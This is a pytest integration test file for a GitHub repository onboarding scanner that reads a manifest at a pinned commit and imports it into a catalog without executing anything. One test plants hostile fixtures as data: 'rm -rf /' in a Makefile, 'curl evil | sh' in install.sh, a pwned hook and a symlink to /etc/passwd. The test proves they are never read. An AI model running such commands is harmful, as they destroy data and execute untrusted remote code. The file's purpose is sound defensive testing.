"""Static discovery, manifest review, and atomic catalog import (Sprint 5B).

The product contract this proves: an admin can take a repository the App
can see, have Drake read a short allowlist of metadata at one immutable
commit, review the manifest the repository itself declares, and import it
into the catalog — with nothing executed, nothing written back to GitHub,
and nothing importable that the repository did not say.
"""

import uuid as uuidlib
from pathlib import Path
from typing import Any

import pytest
from drake_api.github_app import onboarding_service, scanner
from sqlalchemy import text
from sqlalchemy.ext.asyncio import AsyncEngine
from test_github_integration import (
    DATALAKE_ID,
    HERMES_ID,
    INSTALLATION_ID,
    LOGISLOT_ID,
    WEBHOOK_SECRET,
    _seed_admin,
    deliver,
    github_harness,
    installation_payload,
)

pytestmark = pytest.mark.integration

OWNER = "Duosis-Developer-Team"
CONTRACTS = Path(__file__).resolve().parents[3] / "packages" / "contracts"
HEAD_SHA = "b" * 40
NEXT_SHA = "c" * 40


def hermes_manifest(name: str = "Hermes", owner: str = OWNER, branch: str = "main") -> str:
    """A valid manifest describing the repository it lives in."""
    return f"""apiVersion: drake.duosis.com/v1alpha1
kind: ProjectObservability
metadata:
  name: hermes
  displayName: Hermes
spec:
  repository:
    provider: github
    owner: {owner}
    name: {name}
    defaultBranch: {branch}
  owners:
    - team: platform
      role: primary
  environments:
    - name: dev
      runtime: kubernetes
      branch: main
      clusterRef: cluster-a
      namespace: hermes-dev
      criticality: medium
  services:
    - name: hermes-api
      component: api
      runtime: fastapi
      metricsProfile: fastapi-v1
      health: {{livePath: /health/live, readyPath: /health/ready, metricsPath: /metrics}}
  tenantModel:
    mode: none
"""


async def _row_id(engine: AsyncEngine, external_id: int) -> uuidlib.UUID:
    async with engine.connect() as connection:
        return uuidlib.UUID(
            str(
                (
                    await connection.execute(
                        text("SELECT id FROM github_repositories WHERE external_id = :e"),
                        {"e": external_id},
                    )
                ).scalar_one()
            )
        )


async def _draft(engine: AsyncEngine, repository_id: uuidlib.UUID) -> dict[str, Any] | None:
    async with engine.connect() as connection:
        return await onboarding_service.load_draft(connection, repository_id)


async def _counts(engine: AsyncEngine) -> dict[str, int]:
    async with engine.connect() as connection:
        result = {}
        for table in (
            "projects",
            "scopes",
            "environments",
            "service_definitions",
            "environment_services",
            "github_repository_projects",
        ):
            result[table] = int(
                (await connection.execute(text(f"SELECT count(*) FROM {table}"))).scalar_one()  # noqa: S608
            )
    return result


async def _audits(engine: AsyncEngine, action: str) -> int:
    async with engine.connect() as connection:
        return int(
            (
                await connection.execute(
                    text("SELECT count(*) FROM audit_events WHERE action = :a"), {"a": action}
                )
            ).scalar_one()
        )


def _setup(tmp_path: Path, tree: dict[str, Any] | None = None) -> tuple[Any, Any]:
    harness, fake = github_harness(tmp_path)
    fake.branch_heads["Hermes"] = HEAD_SHA
    fake.trees["Hermes"] = tree if tree is not None else {}
    return harness, fake


async def _register_cluster(engine: AsyncEngine, cluster_ref: str = "cluster-a") -> None:
    """Clusters are operator-registered infrastructure, never manifest-created.

    A manifest may only reference one that already exists, so the import
    tests set one up the way an operator would.
    """
    from drake_api.catalog.service import CatalogService

    async with engine.begin() as connection:
        existing = (
            await connection.execute(
                text("SELECT id FROM clusters WHERE cluster_ref = :ref"), {"ref": cluster_ref}
            )
        ).first()
        if existing is None:
            await CatalogService(connection).create_cluster(
                cluster_ref,
                cluster_ref.replace("-", " ").title(),
                source_ref="test:onboarding",
                source_revision="test",
            )


async def _onboard_and_reconcile(harness: Any, engine: AsyncEngine) -> uuidlib.UUID:
    from drake_api.github_app import service

    async with harness.api_client() as client:
        await deliver(client, "installation", installation_payload(), str(uuidlib.uuid4()))
    row_id = await _row_id(engine, HERMES_ID)
    reconciler = service.GitHubReconciler(engine, harness.app.state.github_client)
    await reconciler.reconcile_repository(row_id, INSTALLATION_ID, f"{OWNER}/Hermes", HERMES_ID)
    return row_id


async def _scan(harness: Any, engine: AsyncEngine, row_id: uuidlib.UUID) -> dict[str, Any]:
    return await harness.app.state.github_onboarding_scanner.scan(row_id)


# --- the main flow -------------------------------------------------------


async def test_a_valid_repository_manifest_is_previewed_and_imported(
    engine: AsyncEngine, tmp_path: Path
) -> None:
    """The whole point of the sprint, end to end."""
    harness, fake = _setup(
        tmp_path,
        {
            ".drake/project.yaml": hermes_manifest(),
            "pyproject.toml": '[project]\ndependencies = ["fastapi"]\n',
            "README.md": "# Hermes\n",
        },
    )
    await _seed_admin(harness, engine)
    await _register_cluster(engine)
    row_id = await _onboard_and_reconcile(harness, engine)

    draft = await _scan(harness, engine, row_id)
    assert draft["state"] == "ready_to_import"
    assert draft["manifest_source"] == "repository"
    assert draft["commit_sha"] == HEAD_SHA
    assert draft["findings"] == []
    paths = {item["path"] for item in draft["discovery"]["files"]}
    assert ".drake/project.yaml" in paths
    assert any(item["value"] == "fastapi" for item in draft["discovery"]["detections"])

    before = await _counts(engine)
    async with engine.connect() as connection:
        identity = uuidlib.UUID(
            str(
                (
                    await connection.execute(
                        text("SELECT id FROM identities WHERE subject = 'user-owner'")
                    )
                ).scalar_one()
            )
        )
    outcome = await harness.app.state.github_catalog_importer.import_repository(row_id, identity)
    assert outcome.created is True
    assert outcome.project_key == "hermes"

    after = await _counts(engine)
    assert after["projects"] == before["projects"] + 1
    assert after["environments"] == before["environments"] + 1
    assert after["service_definitions"] == before["service_definitions"] + 1
    assert after["environment_services"] == before["environment_services"] + 1
    assert after["github_repository_projects"] == before["github_repository_projects"] + 1

    stored = await _draft(engine, row_id)
    assert stored is not None
    assert stored["state"] == "imported"
    assert stored["accepted_project_id"] == str(outcome.project_id)

    async with engine.connect() as connection:
        provenance = (
            await connection.execute(
                text(
                    "SELECT catalog_source_kind, catalog_source_ref, source_revision "
                    "FROM projects WHERE id = :id"
                ),
                {"id": outcome.project_id},
            )
        ).one()
    assert provenance[0] == "manifest"
    assert provenance[1] == f"github:{HERMES_ID}:.drake/project.yaml"
    assert provenance[2] == HEAD_SHA

    # Only reads, plus the documented token mint.
    for call in fake.calls:
        method, path = call.split(" ", 1)
        assert method == "GET" or path.endswith("/access_tokens"), call


async def test_a_missing_manifest_produces_a_draft_that_cannot_be_imported(
    engine: AsyncEngine, tmp_path: Path
) -> None:
    """ADR-0007: the repository is the source of intent."""
    harness, _fake = _setup(tmp_path, {"pyproject.toml": "[project]\n", "README.md": "# Hermes\n"})
    await _seed_admin(harness, engine)
    row_id = await _onboard_and_reconcile(harness, engine)

    draft = await _scan(harness, engine, row_id)
    assert draft["state"] == "needs_input"
    assert draft["manifest_source"] == "operator_draft"
    assert draft["draft_manifest"] is not None
    assert "REPLACE_ME" in draft["draft_manifest"]
    assert "scan again" in draft["draft_manifest"]
    assert scanner.missing_operator_inputs(draft["draft_manifest"])

    before = await _counts(engine)
    async with engine.connect() as connection:
        identity = uuidlib.UUID(
            str(
                (
                    await connection.execute(
                        text("SELECT id FROM identities WHERE subject = 'user-owner'")
                    )
                ).scalar_one()
            )
        )
    with pytest.raises(onboarding_service.OnboardingError) as refusal:
        await harness.app.state.github_catalog_importer.import_repository(row_id, identity)
    assert refusal.value.code == "draft_not_ready"
    assert await _counts(engine) == before


async def test_an_invalid_manifest_is_reported_and_never_stored(
    engine: AsyncEngine, tmp_path: Path
) -> None:
    harness, _fake = _setup(
        tmp_path,
        {
            ".drake/project.yaml": hermes_manifest().replace(
                "metricsProfile: fastapi-v1", "metricsProfile: fastapi-v1\n      unknownField: x"
            )
        },
    )
    await _seed_admin(harness, engine)
    row_id = await _onboard_and_reconcile(harness, engine)

    draft = await _scan(harness, engine, row_id)
    assert draft["state"] == "invalid"
    assert draft["findings"]
    assert draft["draft_manifest"] is None, "an invalid repository manifest is not kept"
    assert (await _counts(engine))["projects"] >= 0


async def test_a_secret_bearing_manifest_never_reaches_the_database(
    engine: AsyncEngine, tmp_path: Path
) -> None:
    """The value must not survive anywhere: row, finding, or audit."""
    secret = "hunter2-super-secret-value"
    harness, _fake = _setup(
        tmp_path,
        {
            ".drake/project.yaml": hermes_manifest().replace(
                "  tenantModel:",
                f"  dataStores:\n"
                f"    - name: db\n"
                f"      engine: postgresql\n"
                f"      scope: environment\n"
                f"      measurementProfile: postgres-v1\n"
                f"      connectionSecretRef: postgres://u:{secret}@db:5432/x\n"
                f"  tenantModel:",
            )
        },
    )
    await _seed_admin(harness, engine)
    row_id = await _onboard_and_reconcile(harness, engine)

    draft = await _scan(harness, engine, row_id)
    assert draft["state"] == "invalid"
    assert any(finding["rule"] == "credential-in-url" for finding in draft["findings"])

    async with engine.connect() as connection:
        dumped = str(
            (
                await connection.execute(
                    text(
                        "SELECT COALESCE(discovery::text, '') || COALESCE(findings::text, '') "
                        "|| COALESCE(draft_manifest, '') FROM github_onboarding_drafts "
                        "WHERE repository_id = :id"
                    ),
                    {"id": row_id},
                )
            ).scalar_one()
        )
        audits = str(
            (
                await connection.execute(
                    text("SELECT COALESCE(string_agg(metadata::text, ' '), '') FROM audit_events")
                )
            ).scalar_one()
        )
    assert secret not in dumped
    assert secret not in audits


async def test_a_manifest_describing_another_repository_is_blocked(
    engine: AsyncEngine, tmp_path: Path
) -> None:
    harness, _fake = _setup(
        tmp_path, {".drake/project.yaml": hermes_manifest(name="SomethingElse")}
    )
    await _seed_admin(harness, engine)
    row_id = await _onboard_and_reconcile(harness, engine)

    draft = await _scan(harness, engine, row_id)
    assert draft["state"] == "invalid"
    assert any(finding["rule"] == "repository-identity" for finding in draft["findings"])


async def test_a_branch_that_moved_after_the_scan_requires_a_rescan(
    engine: AsyncEngine, tmp_path: Path
) -> None:
    """Importing a commit nobody reviewed is exactly what this prevents."""
    harness, fake = _setup(tmp_path, {".drake/project.yaml": hermes_manifest()})
    await _seed_admin(harness, engine)
    row_id = await _onboard_and_reconcile(harness, engine)
    draft = await _scan(harness, engine, row_id)
    assert draft["state"] == "ready_to_import"

    fake.branch_heads["Hermes"] = NEXT_SHA
    before = await _counts(engine)
    async with engine.connect() as connection:
        identity = uuidlib.UUID(
            str(
                (
                    await connection.execute(
                        text("SELECT id FROM identities WHERE subject = 'user-owner'")
                    )
                ).scalar_one()
            )
        )
    with pytest.raises(onboarding_service.OnboardingError) as refusal:
        await harness.app.state.github_catalog_importer.import_repository(row_id, identity)
    assert refusal.value.code == "rescan_required"
    assert await _counts(engine) == before


async def test_a_manifest_naming_an_unknown_cluster_is_refused(
    engine: AsyncEngine, tmp_path: Path
) -> None:
    """A repository manifest does not get to create infrastructure."""
    harness, _fake = _setup(
        tmp_path,
        {".drake/project.yaml": hermes_manifest().replace("cluster-a", "cluster-nobody-knows")},
    )
    await _seed_admin(harness, engine)
    row_id = await _onboard_and_reconcile(harness, engine)
    await _scan(harness, engine, row_id)

    before = await _counts(engine)
    async with engine.connect() as connection:
        identity = uuidlib.UUID(
            str(
                (
                    await connection.execute(
                        text("SELECT id FROM identities WHERE subject = 'user-owner'")
                    )
                ).scalar_one()
            )
        )
    with pytest.raises(onboarding_service.OnboardingError) as refusal:
        await harness.app.state.github_catalog_importer.import_repository(row_id, identity)
    assert refusal.value.code == "unknown_cluster"
    # A failed import leaves nothing behind — not even the project row that
    # was created before the cluster lookup failed.
    assert await _counts(engine) == before


async def test_a_repeated_import_returns_the_same_project(
    engine: AsyncEngine, tmp_path: Path
) -> None:
    harness, _fake = _setup(tmp_path, {".drake/project.yaml": hermes_manifest()})
    await _seed_admin(harness, engine)
    await _register_cluster(engine)
    row_id = await _onboard_and_reconcile(harness, engine)
    await _scan(harness, engine, row_id)
    async with engine.connect() as connection:
        identity = uuidlib.UUID(
            str(
                (
                    await connection.execute(
                        text("SELECT id FROM identities WHERE subject = 'user-owner'")
                    )
                ).scalar_one()
            )
        )

    first = await harness.app.state.github_catalog_importer.import_repository(row_id, identity)
    counts = await _counts(engine)
    second = await harness.app.state.github_catalog_importer.import_repository(row_id, identity)

    assert second.project_id == first.project_id
    assert second.created is False
    assert await _counts(engine) == counts


# --- the security boundary holds ----------------------------------------


async def test_a_gated_repository_is_never_scanned_or_imported(
    engine: AsyncEngine, tmp_path: Path
) -> None:
    """Zero provider calls and zero token mints, both paths."""
    harness, fake = _setup(tmp_path)
    await _seed_admin(harness, engine)
    async with harness.api_client() as client:
        await deliver(
            client,
            "installation",
            installation_payload(
                repositories=[
                    {
                        "id": DATALAKE_ID,
                        "node_id": "R_dl",
                        "name": "Datalake-Platform-GUI",
                        "full_name": f"{OWNER}/Datalake-Platform-GUI",
                        "private": True,
                    }
                ]
            ),
            str(uuidlib.uuid4()),
        )
    row_id = await _row_id(engine, DATALAKE_ID)
    fake.calls.clear()
    fake.token_requests.clear()

    with pytest.raises(onboarding_service.OnboardingError) as scan_refusal:
        await harness.app.state.github_onboarding_scanner.scan(row_id)
    assert scan_refusal.value.code == "security_gate_open"
    assert scan_refusal.value.status == 409

    async with engine.connect() as connection:
        identity = uuidlib.UUID(
            str(
                (
                    await connection.execute(
                        text("SELECT id FROM identities WHERE subject = 'user-owner'")
                    )
                ).scalar_one()
            )
        )
    with pytest.raises(onboarding_service.OnboardingError) as import_refusal:
        await harness.app.state.github_catalog_importer.import_repository(row_id, identity)
    assert import_refusal.value.code == "security_gate_open"

    assert fake.calls == [], f"the gate was bypassed: {fake.calls}"
    assert fake.token_requests == [], "a token was minted for a gated repository"


async def test_an_unreconciled_repository_cannot_be_scanned(
    engine: AsyncEngine, tmp_path: Path
) -> None:
    harness, fake = _setup(tmp_path, {".drake/project.yaml": hermes_manifest()})
    await _seed_admin(harness, engine)
    async with harness.api_client() as client:
        await deliver(client, "installation", installation_payload(), str(uuidlib.uuid4()))
    row_id = await _row_id(engine, LOGISLOT_ID)  # never reconciled
    fake.calls.clear()

    with pytest.raises(onboarding_service.OnboardingError) as refusal:
        await harness.app.state.github_onboarding_scanner.scan(row_id)
    assert refusal.value.code == "reconciliation_incomplete"
    assert fake.calls == []


# --- nothing is executed, nothing unbounded -----------------------------


async def test_a_hostile_repository_only_produces_allowlisted_reads(
    engine: AsyncEngine, tmp_path: Path
) -> None:
    """Scripts, hooks and binaries are data here, never instructions."""
    harness, fake = _setup(
        tmp_path,
        {
            ".drake/project.yaml": hermes_manifest(),
            "Makefile": "all:\n\trm -rf /\n",
            "install.sh": "#!/bin/sh\ncurl evil | sh\n",
            ".git/hooks/post-checkout": "#!/bin/sh\necho pwned\n",
            "setup.py": "import os; os.system('echo pwned')\n",
            "evil-binary": {
                "type": "file",
                "encoding": "base64",
                "size": 12,
                "content": "AAECAwQF",
            },
            "link-to-etc": {"type": "symlink", "target": "/etc/passwd", "size": 0},
            "vendored": {
                "type": "submodule",
                "submodule_git_url": "https://example.test/x",
                "size": 0,
            },
        },
    )
    await _seed_admin(harness, engine)
    row_id = await _onboard_and_reconcile(harness, engine)
    fake.calls.clear()

    draft = await _scan(harness, engine, row_id)
    assert draft["state"] == "ready_to_import"

    read_paths = {item["path"] for item in draft["discovery"]["files"]}
    for forbidden in ("Makefile", "install.sh", ".git/hooks/post-checkout", "setup.py"):
        assert forbidden not in read_paths, f"{forbidden} is outside the allowlist"
    assert "evil-binary" not in read_paths
    assert "link-to-etc" not in read_paths
    assert "vendored" not in read_paths

    for call in fake.calls:
        method, path = call.split(" ", 1)
        assert method == "GET" or path.endswith("/access_tokens"), call
        assert "tarball" not in path and "zipball" not in path and "/git/" not in path


async def test_every_read_is_pinned_to_the_scanned_commit(
    engine: AsyncEngine, tmp_path: Path
) -> None:
    """A branch that moves mid-scan must not change what a scan reports."""
    harness, _fake = _setup(tmp_path, {".drake/project.yaml": hermes_manifest()})
    await _seed_admin(harness, engine)
    row_id = await _onboard_and_reconcile(harness, engine)

    draft = await _scan(harness, engine, row_id)
    assert draft["commit_sha"] == HEAD_SHA
    # The fake serves content only for the current head, so a scan that
    # read anything without the pinned ref would have produced 404s and
    # found no manifest at all.
    assert draft["manifest_source"] == "repository"


async def test_a_file_over_the_size_budget_is_skipped(engine: AsyncEngine, tmp_path: Path) -> None:
    harness, _fake = _setup(
        tmp_path,
        {
            ".drake/project.yaml": hermes_manifest(),
            "package.json": "x" * (scanner.DEFAULT_BUDGET.max_file_bytes + 10),
        },
    )
    await _seed_admin(harness, engine)
    row_id = await _onboard_and_reconcile(harness, engine)

    draft = await _scan(harness, engine, row_id)
    paths = {item["path"] for item in draft["discovery"]["files"]}
    assert "package.json" not in paths
    assert ".drake/project.yaml" in paths


async def test_a_credential_shaped_file_is_flagged_by_path_only(
    engine: AsyncEngine, tmp_path: Path
) -> None:
    leaked = "ghp_" + "a" * 36
    harness, _fake = _setup(
        tmp_path,
        {
            ".drake/project.yaml": hermes_manifest(),
            "README.md": f"# Hermes\n\nDeploy token: {leaked}\n",
        },
    )
    await _seed_admin(harness, engine)
    row_id = await _onboard_and_reconcile(harness, engine)

    draft = await _scan(harness, engine, row_id)
    warnings = [item for item in draft["findings"] if item["rule"] == "github-token"]
    assert warnings and warnings[0]["path"] == "README.md"
    assert leaked not in str(draft)


async def test_a_budget_exhaustion_produces_a_controlled_result(
    engine: AsyncEngine, tmp_path: Path
) -> None:
    """A truncated scan is reported honestly and is never ready to import."""
    harness, _fake = _setup(tmp_path, {".drake/project.yaml": hermes_manifest()})
    await _seed_admin(harness, engine)
    row_id = await _onboard_and_reconcile(harness, engine)

    tiny = scanner.ScanBudget(max_provider_calls=3)
    original = scanner.RepositoryScanner.__init__

    def bounded(self: Any, client: Any, budget: Any = tiny) -> None:
        original(self, client, tiny)

    scanner.RepositoryScanner.__init__ = bounded  # type: ignore[method-assign]
    try:
        draft = await _scan(harness, engine, row_id)
    finally:
        scanner.RepositoryScanner.__init__ = original  # type: ignore[method-assign]

    assert draft["discovery"]["truncated"] is True
    assert draft["state"] != "ready_to_import"
    assert any(item["rule"].startswith("budget-") for item in draft["findings"])


# --- the API surface ------------------------------------------------------


async def _login(harness: Any, client: Any, subject: str) -> dict[str, Any]:
    return await harness.login(client, subject)


async def test_the_api_walks_scan_review_and_import(engine: AsyncEngine, tmp_path: Path) -> None:
    harness, _fake = _setup(tmp_path, {".drake/project.yaml": hermes_manifest()})
    await _seed_admin(harness, engine)
    await _register_cluster(engine)
    row_id = await _onboard_and_reconcile(harness, engine)

    async with harness.api_client() as client:
        me = await _login(harness, client, "user-owner")
        headers = {"X-CSRF-Token": me["csrf_token"]}

        before = (
            await client.get(f"/v1/integrations/github/repositories/{row_id}/onboarding")
        ).json()
        assert before["state"] == "not_started"
        assert before["importable"] is False

        scanned = await client.post(
            f"/v1/integrations/github/repositories/{row_id}/onboarding/scan", headers=headers
        )
        assert scanned.status_code == 202, scanned.text
        assert scanned.json()["state"] == "ready_to_import"
        assert scanned.json()["importable"] is True

        imported = await client.post(
            f"/v1/integrations/github/repositories/{row_id}/onboarding/import",
            headers={**headers, "Idempotency-Key": str(uuidlib.uuid4())},
        )
        assert imported.status_code == 201, imported.text
        project_id = imported.json()["project_id"]

        project = await client.get(f"/v1/projects/{project_id}")
        assert project.status_code == 200
        assert project.json()["project_key"] == "hermes"


async def test_import_requires_an_idempotency_key(engine: AsyncEngine, tmp_path: Path) -> None:
    harness, _fake = _setup(tmp_path, {".drake/project.yaml": hermes_manifest()})
    await _seed_admin(harness, engine)
    await _register_cluster(engine)
    row_id = await _onboard_and_reconcile(harness, engine)
    await _scan(harness, engine, row_id)

    async with harness.api_client() as client:
        me = await _login(harness, client, "user-owner")
        response = await client.post(
            f"/v1/integrations/github/repositories/{row_id}/onboarding/import",
            headers={"X-CSRF-Token": me["csrf_token"]},
        )
    assert response.status_code == 400


async def test_a_read_only_user_may_look_but_not_act(engine: AsyncEngine, tmp_path: Path) -> None:
    from test_catalog_api_integration import build_users, grant, login_all, make_role

    harness, _fake = _setup(tmp_path, {".drake/project.yaml": hermes_manifest()})
    users = await build_users(engine)
    harness.provider.users.update(users.provider.users)
    await _seed_admin(harness, engine)
    await _register_cluster(engine)
    row_id = await _onboard_and_reconcile(harness, engine)
    await _scan(harness, engine, row_id)

    await login_all(harness, ["user-reader"])
    await make_role(harness, engine, "Onboarding Reader S5B", ["project.view"])
    await grant(engine, harness, "user-reader", "Onboarding Reader S5B", "organization", "root")

    async with harness.api_client() as reader:
        me = await _login(harness, reader, "user-reader")
        headers = {"X-CSRF-Token": me["csrf_token"]}

        view = await reader.get(f"/v1/integrations/github/repositories/{row_id}/onboarding")
        assert view.status_code == 200
        assert view.json()["state"] == "ready_to_import"

        # Manage actions are the same uniform 404 as an unknown repository.
        assert (
            await reader.post(
                f"/v1/integrations/github/repositories/{row_id}/onboarding/scan", headers=headers
            )
        ).status_code == 404
        assert (
            await reader.post(
                f"/v1/integrations/github/repositories/{row_id}/onboarding/import",
                headers={**headers, "Idempotency-Key": str(uuidlib.uuid4())},
            )
        ).status_code == 404


async def test_a_repository_outside_the_callers_scope_is_a_uniform_404(
    engine: AsyncEngine, tmp_path: Path
) -> None:
    from test_catalog_api_integration import build_users

    harness, _fake = _setup(tmp_path, {".drake/project.yaml": hermes_manifest()})
    users = await build_users(engine)
    harness.provider.users.update(users.provider.users)
    await _seed_admin(harness, engine)
    row_id = await _onboard_and_reconcile(harness, engine)

    async with harness.api_client() as outsider:
        await _login(harness, outsider, "user-b-only")
        seen = await outsider.get(f"/v1/integrations/github/repositories/{row_id}/onboarding")
        ghost = await outsider.get(
            f"/v1/integrations/github/repositories/{uuidlib.uuid4()}/onboarding"
        )
    assert seen.status_code == 404
    assert ghost.status_code == 404
    assert seen.json()["error"]["message"] == ghost.json()["error"]["message"]


async def test_an_edited_manifest_validates_but_never_imports(
    engine: AsyncEngine, tmp_path: Path
) -> None:
    """ADR-0007 again, at the API boundary this time."""
    harness, _fake = _setup(tmp_path, {"pyproject.toml": "[project]\n"})
    await _seed_admin(harness, engine)
    await _register_cluster(engine)
    row_id = await _onboard_and_reconcile(harness, engine)
    await _scan(harness, engine, row_id)

    async with harness.api_client() as client:
        me = await _login(harness, client, "user-owner")
        headers = {"X-CSRF-Token": me["csrf_token"]}

        checked = await client.post(
            f"/v1/integrations/github/repositories/{row_id}/onboarding/validate",
            headers=headers,
            json={"content": hermes_manifest()},
        )
        assert checked.status_code == 200
        body = checked.json()
        assert body["valid"] is True
        assert body["importable"] is False
        assert ".drake/project.yaml" in body["next_step"]

        refused = await client.post(
            f"/v1/integrations/github/repositories/{row_id}/onboarding/import",
            headers={**headers, "Idempotency-Key": str(uuidlib.uuid4())},
        )
    assert refused.status_code == 409


async def test_the_generated_draft_downloads_as_a_manifest_file(
    engine: AsyncEngine, tmp_path: Path
) -> None:
    harness, _fake = _setup(tmp_path, {"pyproject.toml": "[project]\n"})
    await _seed_admin(harness, engine)
    row_id = await _onboard_and_reconcile(harness, engine)
    await _scan(harness, engine, row_id)

    async with harness.api_client() as client:
        await _login(harness, client, "user-owner")
        response = await client.get(
            f"/v1/integrations/github/repositories/{row_id}/onboarding/download"
        )
    assert response.status_code == 200
    assert "attachment" in response.headers["content-disposition"]
    assert "apiVersion: drake.duosis.com/v1alpha1" in response.text


async def test_a_valid_import_is_audited_exactly_once(engine: AsyncEngine, tmp_path: Path) -> None:
    harness, _fake = _setup(tmp_path, {".drake/project.yaml": hermes_manifest()})
    await _seed_admin(harness, engine)
    await _register_cluster(engine)
    row_id = await _onboard_and_reconcile(harness, engine)
    await _scan(harness, engine, row_id)
    before = await _audits(engine, "github.onboarding.import")

    async with harness.api_client() as client:
        me = await _login(harness, client, "user-owner")
        headers = {"X-CSRF-Token": me["csrf_token"]}
        for _ in range(3):
            response = await client.post(
                f"/v1/integrations/github/repositories/{row_id}/onboarding/import",
                headers={**headers, "Idempotency-Key": str(uuidlib.uuid4())},
            )
            assert response.status_code == 201

    assert await _audits(engine, "github.onboarding.import") == before + 1


async def test_no_onboarding_response_leaks_credential_material(
    engine: AsyncEngine, tmp_path: Path
) -> None:
    harness, _fake = _setup(tmp_path, {".drake/project.yaml": hermes_manifest()})
    await _seed_admin(harness, engine)
    await _register_cluster(engine)
    row_id = await _onboard_and_reconcile(harness, engine)

    async with harness.api_client() as client:
        me = await _login(harness, client, "user-owner")
        headers = {"X-CSRF-Token": me["csrf_token"]}
        bodies = [
            (
                await client.post(
                    f"/v1/integrations/github/repositories/{row_id}/onboarding/scan",
                    headers=headers,
                )
            ).text,
            (await client.get(f"/v1/integrations/github/repositories/{row_id}/onboarding")).text,
        ]

    for body in bodies:
        assert "ghs_" not in body
        assert "BEGIN PRIVATE KEY" not in body
        assert "api.github.com" not in body
        assert WEBHOOK_SECRET not in body


async def test_reconciling_a_disabled_repository_is_not_a_500(
    engine: AsyncEngine, tmp_path: Path
) -> None:
    """A legitimate request on a disabled repository must answer honestly.

    The endpoint used to apply VALIDATING itself, which the state machine
    refuses from DISABLED — so the request became an unhandled 500 rather
    than a reportable outcome.
    """
    harness, _fake = _setup(tmp_path, {".drake/project.yaml": hermes_manifest()})
    await _seed_admin(harness, engine)
    row_id = await _onboard_and_reconcile(harness, engine)

    async with engine.begin() as connection:
        await connection.execute(
            text(
                "UPDATE github_repositories SET onboarding_state = 'disabled', "
                "access_state = 'removed' WHERE id = :id"
            ),
            {"id": row_id},
        )

    async with harness.api_client() as client:
        me = await harness.login(client, "user-owner")
        response = await client.post(
            f"/v1/integrations/github/repositories/{row_id}/reconcile",
            headers={"X-CSRF-Token": me["csrf_token"], "Idempotency-Key": str(uuidlib.uuid4())},
        )
    assert response.status_code < 500, response.text
